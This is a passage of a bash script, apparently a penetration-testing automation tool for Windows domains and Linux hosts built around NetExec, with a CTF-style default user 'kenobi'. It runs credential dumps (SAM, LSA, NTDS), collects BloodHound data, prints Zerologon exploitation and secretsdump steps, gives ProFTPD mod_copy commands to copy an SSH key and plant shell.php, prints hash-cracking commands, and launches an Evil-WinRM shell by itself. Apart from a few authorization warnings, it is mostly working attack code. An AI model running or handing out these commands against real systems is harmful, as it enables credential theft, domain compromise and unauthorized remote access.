                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
                log_info "etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
        
        log_section "BloodHound Data Collection"
        log_info "Collecting all data (-c all)..."
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP"
        bh_output=$(timeout 120s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
        echo "$bh_output"
        
        # Extract zip filename and suggest next steps
        zip_file=$(echo "$bh_output" | grep "Compressing output into" | awk '{print $NF}')
        if [ -n "$zip_file" ]; then
             log_success "BloodHound data saved to: ${BWHITE}$zip_file${NC}"
             log_info "1. Run 'neo4j start' and open 'bloodhound'"
             log_info "2. Drag and drop the zip file into BloodHound to analyze."
        fi
    else
        log_warning "Skipping LDAP Module Enumeration & Roasting (requires username AND password/hash)"
    fi
    
    if [ -n "$user" ]; then
        log_section "Domain Controllers"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
    
        log_section "SMB Module Enumeration"
    
        log_info "Spider Plus (Find Interesting Files)"
        print_cmd "nxc smb $IP $USER_FLAG -M spider_plus --timeout 30"
        timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 30 | tee nxc-enum/smb/spider-plus.txt
        
        # Copy spider_plus JSON findings to workspace
        if [ -d "$HOME/.nxc/modules/nxc_spider_plus" ]; then
             cp -r "$HOME/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        fi
        # Also check root path just in case
        if [ -d "/root/.nxc/modules/nxc_spider_plus" ] && [ "$(id -u)" -eq 0 ]; then
             cp -r "/root/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        else
             # Try sudo copy if we can't read it
             sudo cp -r "/root/.nxc/modules/nxc_spider_plus" nxc-enum/smb/ 2>/dev/null
        fi
        
        if [ -d "nxc-enum/smb/nxc_spider_plus" ]; then
            log_success "Spider Plus JSON results copied to: ${BWHITE}nxc-enum/smb/nxc_spider_plus/${NC}"
        fi
    
        log_info "Check Zerologon Vulnerability"
        print_cmd "nxc smb $IP $USER_FLAG -M zerologon --timeout 5"
        zerologon_output=$(timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt)
        echo "$zerologon_output"
        
        # Check if Zerologon vulnerability was found
        if echo "$zerologon_output" | grep -qi "VULNERABLE\|Exploit\|SUCCESS"; then
            log_error "CRITICAL: Zerologon vulnerability detected!"
            log_warning "WARNING: Exploiting Zerologon will break the domain! Only use in authorized testing."
            log_success "Suggested exploitation steps:"
            
            # Extract DC name if possible
            dc_name=$(echo "$zerologon_output" | grep -oP 'name:\K[^\)]+' | head -n1 | tr -d ' ')
            if [ -z "$dc_name" ]; then
                dc_name="DC_NAME"
            fi
            
            log_info "1. Exploit Zerologon to reset DC machine account password:"
            echo "python3 /usr/share/doc/python3-impacket/examples/zerologon_tester.py $dc_name $IP"
            echo ""
            log_info "2. Dump credentials using the zeroed password:"
            echo "impacket-secretsdump -no-pass $dc_name\$@$IP"
            echo ""
            log_info "3. IMPORTANT: Restore the original password using the hex key from secretsdump:"
            echo "python3 /path/to/restorepassword.py $dc_name $IP -hexpass <HEX_PASSWORD_FROM_SECRETSDUMP>"
            echo ""
            log_error "CRITICAL: You MUST restore the password or the domain will be broken!"
            echo ""
        fi
    
        log_section "MSSQL Enumeration"
    
        if check_port $IP 1433 "MSSQL"; then
            log_info "MSSQL Info"
            print_cmd "nxc mssql $IP $USER_FLAG"
            unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt
        
            log_info "MSSQL Query (xp_dirtree)"
            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree \"C:\\\\\", 1;'"
            unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
        
            log_info "MSSQL Query (sp_databases)"
            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;'"
            unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
        fi
        
        log_section "VNC Enumeration"
    
        log_info "VNC Credentials Check"
        # VNC doesn't support hash authentication, only password
        if [ -n "$pass" ]; then
            print_cmd "nxc vnc $IP -u \"$user\" -p \"$pass\""
            timeout 5s unbuffer nxc vnc $IP -u "$user" -p "$pass" | tee nxc-enum/smb/vnc-credentials.txt
        else
            log_warning "Skipping VNC check (VNC requires password, not hash)"
        fi
    
        log_section "WMI Enumeration"
    
        log_info "WMI Credentials Check"
        # WMI uses RPC (135) and dynamic ports. We check 135.
        if check_port $IP 135 "WMI (RPC)"; then
             check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
    
             log_info "WMI Command Execution (whoami)"
             print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
             unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
        else
             log_warning "Skipping WMI check (Port 135 closed)"
        fi
    
            log_section "SMB Additional Enumeration"
    
        log_info "SAM Hashes Dump"
        print_cmd "nxc smb $IP $USER_FLAG --sam"
        unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
    
        log_info "LSA Secrets Dump"
        print_cmd "nxc smb $IP $USER_FLAG --lsa"
        unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt

        # enum4linux-ng Authenticated Scan
        if command -v enum4linux-ng &> /dev/null; then
            log_info "Running enum4linux-ng (Authenticated - MAX INFO)"
            echo "    Running with -A (All), -R (RID Cycle), -d (Detailed)"
            if [ -n "$hash" ]; then
                print_cmd "enum4linux-ng -u \"$user\" -H \"$hash\" -A -R -d $IP"
                timeout 600s enum4linux-ng -u "$user" -H "$hash" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
            elif [ -n "$pass" ]; then
                print_cmd "enum4linux-ng -u \"$user\" -p \"$pass\" -A -R -d $IP"
                timeout 600s enum4linux-ng -u "$user" -p "$pass" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
            fi
        fi
    else
        log_warning "Skipping Additional Windows Enumeration (no username supplied)"
    fi
else
    log_warning "Skipping Windows-specific enumeration (target OS: Linux)"
    log_info "Linux enumeration mode - focusing on SSH, FTP, and SMB (Samba)"
fi

# SSH and FTP enumeration (works for both Windows and Linux)
if [ -n "$user" ]; then
    log_section "SSH Enumeration"
    
    log_info "SSH Credentials Check"
    # SSH doesn't support hash authentication
    if [ -n "$pass" ]; then
        if check_port $IP 22 "SSH"; then
            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\""
            ssh_output=$(unbuffer nxc ssh $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ssh-credentials.txt)
            echo "$ssh_output"
            
            # Check if SSH access was successful and suggest connection
            if echo "$ssh_output" | grep -q "\[+\].*Shell access"; then
                log_success "SSH access successful! Connect with:"
                echo "ssh -o StrictHostKeyChecking=no $user@$IP"
                echo ""
                log_info "Or with password in command (less secure):"
                echo "sshpass -p '$pass' ssh -o StrictHostKeyChecking=no $user@$IP"
                echo ""
                log_info "Copy files from remote:"
                echo "scp -o StrictHostKeyChecking=no $user@$IP:/path/to/file ."
                echo ""
                log_info "Copy files to remote:"
                echo "scp -o StrictHostKeyChecking=no localfile $user@$IP:/path/to/destination"
                echo ""
            fi
        fi
    else
        log_warning "Skipping SSH check (SSH requires password, not hash)"
    fi

    log_info "SSH Command Execution (whoami)"
    if [ -n "$pass" ]; then
        if check_port $IP 22; then
            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\" -x \"whoami\""
            unbuffer nxc ssh $IP -u "$user" -p "$pass" -x "whoami" | tee nxc-enum/smb/ssh-whoami.txt
        fi
    else
        log_warning "Skipping (SSH requires password)"
    fi
    
    log_section "FTP Enumeration"
    
    log_info "FTP Credentials Check"
    # FTP doesn't support hash authentication
    if [ -n "$pass" ]; then
        if check_port $IP 21 "FTP"; then
            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\""
            timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ftp-credentials.txt
            
            # Suggest manual FTP/NC connection
            log_info "Manual FTP connection:"
            echo "ftp ftp://$user:$pass@$IP"
            echo "nc -nv $IP 21"
            echo ""
        fi
    else
        log_warning "Skipping FTP check (FTP requires password, not hash)"
    fi
    
    log_info "FTP Share Enumeration"
    if [ -n "$pass" ]; then
        if check_port $IP 21; then
            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\" --ls"
            timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" --ls | tee nxc-enum/smb/ftp-shares.txt
        fi
    else
        log_warning "Skipping (FTP requires password)"
    fi
else
    log_warning "Skipping SSH/FTP Enumeration (no username supplied)"
fi

# FTP Unauthenticated / Banner Grab (Check for ProFTPD Exploit)
log_section "FTP Banner Grab & Exploit Check"
if check_port $IP 21; then
    log_success "FTP port 21 is OPEN!"

    # Grab banner
    log_info "FTP Banner:"
    print_cmd "nc -nv $IP 21"
    ftp_banner=$(timeout 5 nc -nv $IP 21 2>/dev/null)
    echo "$ftp_banner"

    # Check for ProFTPD mod_copy exploit (CVE-2015-3306)
    # This specifically looks for ProFTPD which affects versions <= 1.3.5
    if echo "$ftp_banner" | grep -qi "ProFTPD"; then
        log_error "ProFTPD detected! Possible mod_copy vulnerability (CVE-2015-3306)"

        # Determine target user for the path
        target_user="kenobi" # Fallback default

        # 1. Use manual argument if provided
        if [ -n "$user" ]; then
            target_user="$user"
        else
            # 2. Try to find a user from enumeration (lookupsid/rpc)
            # Find the most recent users file from the 'users_*.txt' pattern
            users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)

            if [ -f "$users_file" ] && [ -s "$users_file" ]; then
                # Get first user from the file
                found_user=$(head -n 1 "$users_file")
                if [ -n "$found_user" ]; then
                     target_user="$found_user"
                fi
            fi
        fi

        log_info "Try manual exploitation with nc (copy files without auth):"
        echo "nc $IP 21"
        echo "SITE CPFR /home/$target_user/.ssh/id_rsa"
        echo "SITE CPTO /var/tmp/id_rsa"
        echo "SITE CPFR /var/www/html/index.php"
        echo "SITE CPTO /var/www/html/shell.php"
        echo ""
    fi

    log_info "Manual connection:"
    echo "nc -nv $IP 21"
    echo ""
else
    log_warning "FTP (Port 21) seems closed."
fi

# Telnet Enumeration (using available tool checking)
log_section "Telnet Enumeration"
if check_port $IP 23; then
    log_success "Telnet port 23 is OPEN!"
    log_info "Suggested connection commands:"
    echo "telnet -l $user $IP"
    echo "nc -nv $IP 23"
    echo ""
    log_info "Banner grab:"
    print_cmd "nc -nv $IP 23"
    timeout 5 nc -nv $IP 23
    echo ""
else
    log_warning "Telnet (Port 23) seems closed."
    log_info "If you believe this is an error, try manually:"
    echo "    nc -nv $IP 23"
fi

# Web Enumeration (HTTP/HTTPS)
log_section "Web Enumeration (HTTP/HTTPS)"
web_ports=(80 443 8080 8443 8000 8008 8888)
for port in "${web_ports[@]}"; do
    if check_port $IP $port; then
        protocol="http"
        if [[ "$port" == "443" || "$port" == "8443" ]]; then
            protocol="https"
        fi
        url="${protocol}://${IP}:${port}"
        log_success "Port $port is OPEN ($protocol)!"
        
        log_info "Banner Grab (curl):"
        print_cmd "curl -I -k -s -m 5 $url"
        curl -I -k -s -m 5 $url 2>/dev/null | tee nxc-enum/http/headers_${port}.txt

        log_info "Checking robots.txt:"
        curl -k -s -m 5 $url/robots.txt 2>/dev/null | tee nxc-enum/http/robots_${port}.txt
        
        log_success "Suggested Web Tools:"
        echo "whatweb $url"
        echo "gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt -k"
        echo "nikto -h $url"
    fi
done

# Advanced DACL enumeration (requires credentials)
if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
    log_section "Advanced DACL Enumeration"

    log_info "Administrator's ACE"
    print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
    timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt

    # Build domain DN from domain name
    if [ -n "$domain" ]; then
        # Convert domain.local to DC=domain,DC=local
        domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')

        log_info "DCSync Rights"
        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN=\"$domain_dn\" ACTION=read RIGHTS=DCSync"
        timeout 60s unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt

        log_info "What these checks reveal:"
        echo "  - Administrator ACE: Shows who can modify the Administrator account"
        echo "  - DCSync Rights: Shows who can dump domain credentials (critical finding!)"
        echo ""
    else
        log_warning "Skipping DCSync rights check (no domain name provided)"
    fi
fi

# NTDS Dump - Run at the very end since it can crash the DC
if [ "$os_type" = "windows" ] && [ -n "$user" ]; then
    log_section "FINAL CHECK: NTDS Database Dump"

    log_warning "NTDS dump can crash DC on Windows Server 2019!"
    log_warning "This is run LAST to avoid interrupting other enumeration."
    log_info "Alternative: impacket-secretsdump was already run above (safer)"
    echo ""

    log_info "Proceed with NTDS dump? [y/N]"
    read -t 10 -n 1 response
    echo ""

    if [[ "$response" =~ ^[Yy]$ ]]; then
        log_warning "Running NTDS Dump..."
        print_cmd "nxc smb $IP $USER_FLAG --ntds"
        unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
    else
        log_info "NTDS dump skipped (timed out or declined)"
        log_info "To run manually: ${BWHITE}nxc smb $IP $USER_FLAG --ntds${NC}"
    fi
fi



# Ask to run anonymous enumeration if credentials were provided
if [ -n "$user" ] && [ "$ANON_RUN" = "false" ]; then
    echo ""
    log_section "Anonymous / Guest Enumeration"
    echo -e "${BYELLOW}❓ Do you want to continue on anonymous / guest mode?${NC}"
    read -p "   [y/N]: " run_anon_choice
    echo ""
    if [[ "$run_anon_choice" =~ ^[Yy]$ ]]; then
        run_anonymous_enumeration
    else
        log_info "Skipping anonymous / guest enumeration."
    fi
fi

echo -e "\n${BGREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
log_success "Enumeration Complete!"
log_info "Results saved to: ${BWHITE}$(pwd)/nxc-enum/${NC}"
echo -e "${BGREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"

# Final step: Automated Evil-WinRM shell if credentials are valid
if [ "$os_type" = "windows" ] && { check_port $IP 5985 || check_port $IP 5986; }; then
    log_section "AUTOMATED SHELL: Evil-WinRM"

    # Check if we already found valid WinRM creds in the log file
    if grep -qi "WINRM" "$VALID_CREDS_FILE" 2>/dev/null; then
        log_success "Valid WinRM credentials detected! Launching shell..."
        log_cmd "evil-winrm $WINRM_CREDS"
        echo ""
        evil-winrm $WINRM_CREDS
    elif [ -n "$user" ] && [ -n "$pass" ]; then
        # If not explicitly in the valid log, try one last validation check for the current user/pass
        log_info "No verified WinRM credentials in logs. Waiting 5s for target to breathe..."
        sleep 5
        log_info "Checking current credentials one last time..."

        # Build command based on local auth preference with longer timeouts
        if [ "$USE_LOCAL_AUTH" = "true" ]; then
            val_out=$(nxc winrm $IP $USER_FLAG --local-auth --timeout 120 --http-timeout 120 2>/dev/null)
        else
            val_out=$(nxc winrm $IP $DOMAIN_FLAG $USER_FLAG --timeout 120 --http-timeout 120 2>/dev/null)
        fi

        if echo "$val_out" | grep -q "+"; then
            log_success "Success! Launching shell..."
            evil-winrm $WINRM_CREDS
        else
            log_error "Error: Username or password are wrong for WinRM access on $IP"
            log_warning "(Note: Also possible that WinRM timed out - increased limit to 120s)"
        fi
    else
        log_warning "WinRM is open, but no valid credentials were provided or discovered."
    fi
fi